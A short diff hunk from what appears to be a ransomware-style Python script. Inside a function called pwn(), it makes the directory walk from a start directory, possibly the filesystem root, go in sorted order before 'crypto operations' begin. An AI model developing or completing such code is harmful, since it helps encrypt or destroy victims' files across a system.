@@ -111,7 +111,7 @@ def pwn():
     dirs = next(os.walk(START_DIR))[1]
     time.sleep(0.7)
     print('beginning crypto operations')
-    for dir in dirs:
+    for dir in sorted(dirs):
         if START_DIR == '/':
             directory = START_DIR + dir
         else:
